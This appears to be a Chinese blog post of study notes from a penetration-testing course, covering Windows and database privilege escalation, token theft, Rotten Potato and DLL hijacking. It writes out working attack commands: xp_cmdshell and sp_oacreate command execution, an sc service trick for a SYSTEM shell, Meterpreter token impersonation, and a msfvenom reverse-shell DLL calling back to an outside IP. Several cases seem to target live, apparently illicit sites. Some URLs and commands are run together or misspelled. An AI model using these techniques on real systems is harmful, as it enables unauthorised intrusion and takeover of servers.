# XD安全渗透测试课程 学习笔记 | 提权阶段

原创 耳鼠 [0x00实验室](javascript:void(0);) *2021-08-08 10:04*

收录于合集

\#渗透测试9个

\#提权1个

\#小迪安全笔记20个

  本文为团队成员耳鼠之前的学习笔记。P58-P64的提权和内网渗透阶段的笔记。分享给各位小白做个参考。

- 

```
https://www.bilibili.com/video/BV1JZ4y1c7ro?from=search&seid=12172181951460188311
```



**day58.网站权限后台漏洞第三方获取**

\#当前知识点在渗透流程中的点

前期-中期-后期对应的知识关系



\#当前知识点在权限提升的重点

知识点顺序,理解思路、分类介绍等



\#当前知识点权限提升权限介绍

注重理解当前权限对应可操作的事情



\#利用成功后的思路需要总结的思路

相关的操作被拒绝无法实现的时候就会涉及到权限提升



\#具体有哪些权限需要我们知道和了解掌握的?

后台权限、网站权限、数据库权限、接口权限、系统权限、域控权限等



后台权限(获得方式:爆破、注入猜解,弱口令等):一般网站或应用后台智能操作应用的界面内容

数据图片等信息,无法操作程序的源代码或服务器上的资源文件。(如后台功能存在文件操作的话也可以



操作文件数据)

网站权限(获得方式:以上三种思路获取):查看或修改(还要看有没有锁权)程序源代码,可以进行网站或应用的配置文件读取(接口配置信息、数据库配置信息等),还能收集服务器操作系统等相关的信息,为后续系统提权做准备。



数据库权限:操作数据库的权限,数据库的增删改查等,源码或配置文件泄露,也可能是网站权限(webshell)进行的数据库配置文件读取获得



接口权限:(邮件、短信、支付等)

后台或网站权限后的获取途径:后台(修改配置信息功能点),网站权限(查看配置文件获取)



演示案例：某挂壁程序后台权限提升-后台功能

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gs1ibGCUch9QYLRlD33ooOl710fGSO5EsUKfRxSPicpVscC4zia1KJaLHkw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



后台地址：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsdq7sGfyxfm0LZfLlNEVLnXYtsObYeg7VGKOzgPEmkqWAVE7jlgsu3A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



抓包分析：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsyjIeHgosf7kyoaWdD1iahlcTp7BIQuXB76eibTocfG1diaeJSwtmSicgVw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsibMicCYCvGLYdPlJicEfUAkgQFBWjl69wibDFGRnp1hhvZa6uDlPT3rLJw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

没有任何过滤,任意文件上传

如果没有代码,我们可以找功能点

SQL执行 文件操作、文件读取、文件写入



------

某BC广告导航⻚权限提升-漏洞层面

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsEiaqugCSyibDiakPF5JBznukoVIOa2UbJiaUYxVY95xYic2Sy4UicHjZI2jA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



抓包分析：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsQLm6lUEBHRIaz1XbcKkHW3lDBv6sfX7F83gDAhVVXnJ8TBQWDgxgQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

通过分析中间件分析,该网站是phpstudy搭建的

先前phpstudy曝过漏洞

漏洞利用时使用postman软件



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsbibYbsqjabaiaIaWmfQWMD8uPIcPZXOEhdsZ1LB0dciatjr0fib3XRsGSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





苏丹大⻄瓜GlassFish中间件-第三方

fofa收集信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gskQ4UnCib5O68TBWlqsChSlyJ8jXVrKPnGiazNEzGeaNcCzvBJGXjMdrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



------

59.Win 溢出漏洞及 AT&SC&PS 提权

涉及的部分资源：

- 
- 
- 
- 
- 
- 
- 
- 
- 

```
https://github.com/ulmon/Vulmaphttps://github.com/bitsadmin/wesnghttps://github.com/unamer/CVE-2018-8120https://github.com/chroblert/MindowsVulnScanhttps://ithub.com/SecWiki/windows-kernel-exploitshttps//www.cnblogs.com/M0rta1s/p/11920903.htmlhTps/docs.microsoft.comzh-cn/sysinternals/downloads/pstoolshttps:/githubcom/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag1
```

\#明确权限提升基础知识:权限划分

\#明确权限提升环境问题:WEB及本地

\#明确权限提升方法针对:针对方法适应问题

\#明确权限提升针对版本:个人及服务器版本;针对方法;

\#知识点必备:用户及用户组权限的划分;Windows提权命令

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gs2CVUh8hQ32tl3pMzX0CKcGp7lCKkKntlZXJJzMa9Za6Cq3vwD8GVrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsADyorkX4FzRdSzn4nY40nlrnIZSyLxicok9icpcrMBYKTJjlicTqb59Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsZXAEhDmXVjgz7aOHu9U9Z76M38qEo99QsjAa0yEHAibGuB8DibuknHibQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

------

演示案例:

基于WEB环境下的权限提升-阿里云靶机

目的:由web权限提升到(溢出漏洞)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gs6GxLVWOAQCAA9lBkNqkmUkDaEjFRicQ9N82ZQiazeUtCWlN2hbucUjEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

已获得目标主机web权限(可以是大码,也可以是一句话然后用工具连接)

提权大部分都会用到cmd

基于本地环境下的权限提升-系统溢出漏洞

将当前用户权限提升至System或者adm

使用漏洞CVE-2020-0787-Windows本地提权

基于本地环境下的权限提升-AT&SC&PS命令

环境:Windows2003



案列给到的知识点总结如下:

案例1:如何判断使用哪种溢出漏洞?漏洞哪里找?

信息收集-补丁筛选-利用MSF或特定EXP(推荐使用MSF)-执行-⻄瓜到手



没有打补丁,不一定有漏洞



Vulmap(使用环境为poweshell,对web提权不友好),Wes(主要用于web提权),

WindowsVulnScan(也是POSWESHELL脚本,也可以将目标systeminfo信息按照他的格式写入KB.json文件中,这样就可以用到WEB环境)对比,exp在哪获取?(可以在github或者百度上搜索)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gst87Jo0qqGhsrWjO0NoRyITRKRJB1dibiaZa3cgq9qEYC709Y4t4AT2ew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gscX6xec14BlnpFibMLnHyW6B7Vy3RAM331vSzFlCrfActBgoQXaFQCQQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如此多的漏洞,应该如何利用

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsGOaZM2FTia2wryNm9LMSImsic8s0WycDm4ym63bwBr6Xfgnbx3n6ypkw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用MSF生成好木⻢,将木⻢通过webshell上传到目标站点,再通过webshell执行木⻢文件

如果是阿里云有用户组,则我们需要添加开放端口,我们可以不使用反弹shell,也可以使用隧道技术绕过。



如何判断使用哪种数据库提权?数据库提权利用条件?MSF结合服务器搭建组合组合拳?模拟上述操作实战演练?



------

案例3:如何判断本地环境可利用漏洞情况?AT&SC&ps命令适用环境?Vulmap,Wes、WindowsVulnScan针对漏洞面,其他方法不同层面

CVE-2020-0708 BitsArbitraryFileMoveExploit

at 15:13 /interactive cmd.exe

可以作用于win7之前的系统



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gscBJhQeVXRrZwUicqJAsc2O9wcONOZeibCFMSNZHfCOlk115OicGsSR5AQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



计划任务 到时自动执行cmd.exe

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gs7hWZjT6WpiaRp4CJD3h9NXrOv7VXJSSGdibZbgyfCclbZGCPIBKtg8iag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

结果运行的cmd为system权限

sc Create syscmd binPath="cmd /k start" typr= own type interact

sc start syscmd

(据说能针对win7或者win8,有待考究



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsaT8nkXGujPfLxCU4EuhTLR2y37vced2TBzMD1dMWNUfRpeuT91edzg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



psexec.exe -accepteula -s -i -d notepad.exe

使用的前提为下载PSTools,针对Windows2008

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsYhc6P3QwHJwtTEzA3nj5RVnHlxBK0EQTQIuEfxXy0mHpuNbJlfa19Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

我们可以再来执行个cmd



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsyuBGzuHibpia2yXIRQwKeXRZGoOUERblgKFX8zQC4aSgoFxgUG3qP6NQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



案例给到的的思路点总结如下:

1.提权方法有部分适用于在不同环境,当然也有通用方法

2.提权方法也有操作系统版本区分,特性决定方法的利用面

3.提权方法有部分需要特定环境,如数据库,第三方提权



------

**day60.MY&MS&ORA 等 SQL 数据库提权**

核心:获得数据库账号密码,可以在web和本地都尝试

在利用系统溢出漏洞无果的情况下,可以采用数据库进行提权,但需要知道数据库提权的前提条件:服务器开启数据库服务及获得最高权限用户密码,除Access数据库外,其他数据库基本都存在数据库提权的可能



\#数据库应用提权在权限提升中的意义

\#WEB或本地环境如何探针数据库应用

\#数据库提权权限用户面收集等方法

\#目前数据库提权对应的技术及方法等

除了access都有提权的可能



数据库提权

1.探针

端口

服务

其他

判断是否存在数据库服务



2.收集(最高权限密码)

配置文件

存储文件

暴力破解

其他方式



3.分类

MySQL

UDF

MOF

启动项

反弹shell



MSSQL

xp_cmdshell

sp_oacreate

sp_oamethod

沙盒模式

映像劫持



Oracle

普通用户

DBA用户

注入模式



Redis

Postgresql

......

------

演示案例

MySQL数据库提权演示-脚本&MSF

流程:服务探针->信息收集->提权利用->获取权限

环境:阿里云(PHP+MYSQL的环境)



1.UDF提权知识点:(基于MYSQL调用命令执行函数)

读取网站数据库配置文件(了解其命名规则及查找技巧)

sql data inc config conn database common include等

读取数据库存储或备份文件(了解其数据库存储格式及对应内容)

mysql数据库的密码存储在mysql数据库中

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsoJZSDslOtbNSD8aR5qv1t215qsXGtQ8zrKNH0l9DNCEhj4AmiabT3TA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果想要获取这个文件,我们可以下载该文件,在.MYD文件中寻找

mysql中的data文件夹中的mysql文件夹的user.MYD

@@basedir/data/数据库名/表名.myd

利用脚本暴力猜解(了解数据库是否支持外联及如何开启外联)

工具爆破(root默认不支持web连接)所以可能无法爆破。脚本爆破,将脚本上传到后⻔上去,这属于本地连接本地。而工具属于电脑连接客户端16远程本地暴力猜解,服务器本地暴力猜解



利用自定义执行函数导出dll文件进行命令执行

select version() select @@basedir



手工创建plugin目录或者利用NTFS流创建

select 'x' into dumpfile '目录/lib/plugin::INDEX_ALLOCATION';

1.mysql<5.1 导出目录c:/windows或system32

2.mysql>=5.1 导出安装目录/lib/plugin/(这个目录默认是没有的,需要我们去创建)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsrcIRYyricMliaKSNjQba2BcgJ7JJcUR5Ka9xAz3ZOjlvrGzFeIm0ib49Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

点击mysql提权,将dll安装到对应的目录

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsFNu6Ddfk8LAffo9iamicBKyiaiaic7lTN7Yoxza6dfGAGkDn6b2svKjZ26g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

完毕后,就可以命令执行了

这是另外一个脚本

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsB7CCeAq67Lo0de7h96wqIhBNwsR8qHH4cB4zPozpW2UsJaiaZDJhfVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



2.MOF知识点:(基于MYSQL特性的安全问题)

导出自定义mof文件到系统目录加载

cnblogs.com/xishaonian/p/6384535.html



3.启动项知识点:(基于配合操作系统自启动)

导出自定义可执行文件到启动目录配合重启执行

将创建好的后⻔或执行文件进行服务器启动项写入,配合重启执行;

实验环境:win2012



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsFM1Q30jpxdgPfMuAoWJicTicvCgWDNxHZSC7icDnZiahQMt7JWgdAUnwhg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



mysql操作开启外连

然后李利用了MSF的exploit/mysql/mysql_start_up

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsztPsYN6libib1meLJXTI8nPmAMnlMIS3vK5r7p9KJTK8kjDhOgiahHLwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

上传后

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsEvxOqFFtDYXLbT02x9kpq543ZXMUsRVcnj9oAnvl85mm2Mswlx1xWg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

是对方重启:DDos



4.反弹知识点:(基于利用反弹特性命令执行)

nc -l -p 5566

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsDCtSrictic5Og4O7lbLAbfYN8MAeo6LgsCaDibSM8vfiaECHCibjjthBKfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsm2bH31wcXc5n9zM08q8ZWtBQhUCxu1uFfRwMziaBnr0PhuYhWQD6tNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



已经获得了网站权限

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsEY9yV8iamW622R5xNJicRaMPYIoGlokFPVAqx2A8sBNvnGFJQ3ACAqzg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



案例:MSSQL数据库提权演示-MSSQL客户端

流程:服务探针-信息收集-提权利用-获取权限

1.使用xp_cmdshell进行提权

xp_cmdshell(数据库-系统数据库-mater-可编程性-系统扩展存储过程)默认在mssql2000中是开启的,在mssql2005之后的版本中则是默认禁止的,如果用户拥有管理员sa权限则可以用sp_congifgure重新开启它



- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```
启用:EXEC sp_configure 'show advanced options',1 ;Reconfigure;EXEC sp_configure 'xp_cmdshell',1;关闭;EXEC sp_configure 'show advanced options',1;reconfigure;exec sp_config 'xp_cmdshell',0;reconfigure;执行;exec master.dbo.xp_cmdshell '命令'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gs2lFfbJOPNS56ta0x6AEzxqHiaIPnAChhl0rGojFpkno2mx8j03eOcQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



如果xp_cmdshell被删除了,可以上传xplog70.dll恢复

exec master.sys.sp_addextendeproc 'xp_cmdshell','c:\Program

Files\Microsoft SQL server\MSSQL\Binn\xplog70.dll'



2.使用sp_oacreate提权

主要用来调用OLE对象,利用OLE对象的run方法执行系统命令。

- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```
启用:EXEC sp_configure 'show advanced options' ,1;Reconfigure with override;EXEC sp_configure 'Ole Automation Procedures',1;Reconfigure with override;关闭:EXEC sp_configure 'show advanced options' ,1;Reconfigure with override;EXEC sp_configure 'Ole Automation Procedures',0;Reconfigure with override;执行:delare @shell int exec sp_oacreate 'wscript.shell',@shelloutput exec sp_oamethod @shell ,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.exe'
```

3.使用SQL server沙盒提权

- 

```
参考资料:https://blog.51cto.com/11797152/2411770
```

- 

```
exec sp_configure 'show advanced options',1;reconfigure;
```

-- 不开启的话在执行xp_regwrite会提示让我们开启



------

案例:Oracle数据库提权演示-自动化工具(Oracleshell)

jsp网站 后⻔不需要提权,自带system

1.普通用户模式

前提是拥有一个普通的oracle连接账号,不需要DBA权限,可提权至DBA,并以

oracle实例运行的权限执行操作系统命令



2.DBA用户模式(自动化工具演示)

拥有DBA账号密码,可以省去自己动手创建存储的繁琐步骤,一键执行测试。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsB1Jmv3z7ibOCJR9o5ybJ4h1FIKCSwP0tbdBDzw6icpPrbaAmxKtD4kJA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

3.注入提升模式:(sqlmap测试演示)

​    拥有一个Oracle注入点,可以通过注入点直接执行系统命令,此种模式没有实现回显,要自己验证

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9I422jEYTCueS4OtyicR3gsDUKjWS2wv0ib5S2teGib94Gjic7rv41bAbTLOdXiaWxZfYcrgG0LqWAc7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



------

**day61.Redis&Postgre& 令牌窃取 & 进程注入**

Redis

利用计划任务执行命令反弹shell

写ssh-keygen公钥使用私钥登录

低权限写webshell



Postgresql

CVE-2018-1058

CVE-2019-9193



演示案例:

Redis数据库权限提升-计划任务

Redis服务因配置不当,可被攻击者恶意利用。黑客借助Redis内置命令,可将现有的数据恶意清空;如果Redis以root身份运行,黑客可往服务器上写入SSH公钥文件,直接登录服务器

连接(未授权或有密码)-利用如下方法提权

- 

```
参考:https://blog.csdn.net/fly_hps/articls/details/80937837
```

(1).利用计划任务执行命令反弹shell

(2).写ssh-keygen公钥然后使用私钥登录

(3).权限较低往web物理路径写webshell



修复方案:

注意:以下操作,均需要重启Redis后才能生效绑定需要访问的数据库的IP,将127.0.0.1修改为需要访问此数据库的iPhone地址。

设置访问密码。在Redis。conf中requirepass字段后,设置添加访问密码。

修改Redis服务运行的账号,以低权限运行Redis服务,禁用账号的登录权限



PostgreSQL数据库权限提升

  PostgreSQL是一种关系型数据库,其中9.3到11版本中存在一处‘特性’,管理员或具有“COPYTO/FROGRAM”权限的用户,可以使用这个特性执行任意命令。



提权利用的漏洞:CVE-2019-9193 CVE-2018-1058

连接-利用漏洞-执行-提权

- 

```
参考:https://vulhub.org/#/environments/postgres/
```

修复方案:升级版本或打上补丁

**
**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawBOwFGGgd8ph6VbAWVasu8nNQIzmCiaM4TEt9tLqAex8Ypzic6h17Pokw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

高权限就是数据库的名字

Windows2008&7令牌窃取提升-本地

一个进程的是由某个用户执行的,可以窃取该用户的令牌

进行远程过程调用时请求提升权限,然后调用它从而生成特权安全令牌以执行特权操作。当系统允许

令牌不仅用于进程本身,还用于原始请求进程时,漏洞就会出现。

本地提权实验:获取会话-利用模块-窃取令牌-提权

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawNZRMicQTpZFD6noadDRS70qiaAfAKZoDdgdJXTicrq425ncPJatWDJfLA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



生成木⻢用于反弹shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawoz2JRgYC30p1ErwZic9LUu3eMc0Es6PWhQdKOFiagRc2gfPXTgkyrvPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



起监听：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawNDicruXQ8m1efBqlHEgHZibMgj1JfrY7ibDtPduDu9yL27ZltQC1wlzTA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



令牌窃取：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawXS1knwFBmcriaLIm5V4oDo9pj2ico0ybvkTrsiccvr6qWgQibgoe0E7nyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



Windows2003&10进程注入提升-本地

​    进程注入提权是本地提权方式的一种较为老的安全技术了,利用的是注入进程的所有这实现权限共享机制,这类技术主要利用在Windows2008之前的操作系统上,所以我们需要学习后续的本地提权更多的手法才能针对诰颁布的系统

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawVd5B0ps7goIlxfS7iaSS4E7ZJTNv4OmspZibLvNrP5qldF4wQsPicsWbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawSNiaXNcJgFdpbPZu5Fu5lCOZmTACWRQdHAMls1VjgW0DTehjDiaD910g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在主机开放8888端口,只要有人连接就将cmd反弹给对方

pexec64 32进程注入工具针对-win2008及后操作系统-(佛系)

- 
- 
- 
- 

```
部分涉及的资源：https://www.blib.cn/soft/pexec.ziphttps://www.tarasco.org/security/Process_lnjector/processinjector.ziphttps://cnblogs.com/LyShark/p/13785619.html
```



------



**day62. 烂土豆 &dll 劫持 & 引号路径 & 服务权限**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawGicRVs4bdmmqGN4QlAJStdIBGMBK48nFjeYeQnxlKx3a3UeFRgwnicicA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw87Wlefib3iaaEqN2tlzpYEv2hsYaSdLRYw78zVhnCtmfVZEqb0rRMrTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



必备知识点:

\#令牌窃取配合烂土豆提权

单纯令牌窃取:web权限或本地提权

如配合烂土豆提权:web或数据库等权限



\#不带引号服务路径安全问题

服务路径提权:web权限或本地提权



\#不安全的服务权限配置问题

服务权限配置:WEB权限或本地提权(web几率小)



\#补充说明:dll劫持提权及AlwaysInstallElevated等说明

dll劫持提权需要特定软件应用的控制权限及启用配合,复杂鸡肋

AlwaysInstallElevated提权默认禁用配置,利用成功机会很少



演示案例：

Win2012-烂土豆配合令牌窃取提权-Web权限

如果单单用令牌窃取,权限太低,无法窃取。例如,如果是web权限(IIS类似的服务权限)

原理:参考上述图片内容,非服务类用户权限无法窃取成功(原理)

过程:上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功

- 
- 
- 
- 
- 
- 
- 

```
upload /root/potato.exe C:\Users\Publiccd C:\\Users\\Publicuse incognitolist_tokens -uexecute -cH -f ./potato.exelist_tokens -uimpersonate_token "NT AUTHORITY\\SYSTEM"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaww0picKJxZbDKyVOxXq9GyxPf2ia75PCkwcSI8vp61Jp2KjdAUK2DTaIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawu0bRHm7kIYaf04eu4cCiccHd2D7XgybmGzQR2nIxBmrnkMiaQT8w3jEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

通过webshell上传木⻢,并且执行

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawm5cQjibSB4YEUBk5OxnKhWYEKRVACEcdvUXFKggUEErmBMQkiaO6ricicg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

执行之前先在msf上开启监听

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawBmPylvZ6Hhv9BDdlDzlOW7BaLKgoyjosSic84xxgJImP8Khz1NNuf7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



执行之后在msf看到会话

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawX4Z7UibWUJiarazLHbWeSgRFic0DD1yValLQbhpkd0GKbk5Jlf2HXjWPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

上传烂土豆并且执行(执行并非在webshell上执行,而是在MSF上执行)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw0Bib1HluBL1vtzLAK9ZbAHx3elibeGpkzhYFEGOzV27emapZKoibnlKjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在msf中没有在C盘列表中看到potato.exe文件,但通过webshell我们可以知道我们已经上传了,在C盘根目录之后再使用令牌窃取



Win2012-DLL劫持提权应用配合MSF-web权限

原理:Windows程序启动的时候需要DLL,如果这些DLL 不存在,则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常,Windows应用程序有其预先定义好的搜索DLL的路径,它会根据下面的顺序进行搜索:

1.应用程序加载的目录

2.C:\Windows\system32

3.C:\Windows\system

4.C:\windows

5.当前工作目录Current Working Directory,CWD

6.在PATH环境变量的目录(先系统后用户)



过程:信息收集(搜集服务器上其他的第三方应用)-进程调试(分析这个程序启动时调用那些dll)-制作dll并上传-替换dll-启动应用后成功

msfvenom -p windows/meterpreter/reverse_tcp

lhost=101.37.169.46 lport=6677 -f ddl >/opt/xiaodi.dll



收集信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawhIHG0PnnKO5ZXqzSTibEoC5whCDzXWEI4LI2ZrXicGkeZkK4ia0KbWkTA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





发现一个flashfxp第三方软件

进程调试

在网上下载flashfxp软件

用火绒剑来调试软件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawnjAEFau9L8cX0f8lCkxMaQGejITyERx0Y9VRLYB9u9kkOt1iaHr0HLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



寻找非系统文件

生成dll

使用MSF生产dll,使用上述命令

替换dll,MSF监听,当软件执行时调用dll,反弹成功



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw1tNe3nic9CWoH88hUjX2tKMuo8stP1MfZuPKhhEZYZnOmr6zItguF7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



然后再使用令牌窃取提权至system

满足条件:

y有第三方软件

能够替换dll

管理员要去运行这个程序



**win2012-不安全的服务权限配合MSF-本地权限**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawXicrqBMr64ostJzq3br0Yh1U6reWuyCIp6nYFfZ4VhbLpjyobY332Gg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawf924CRZiaFMsoXAOJMgckOfFdFOsoHqsWJIggfppxk2KbLNsl11Wv9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawKICskRgwuFFAibkO1kz2A5jftTU7SohzG0mOuaeOElP9n1Kia8aozZjg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



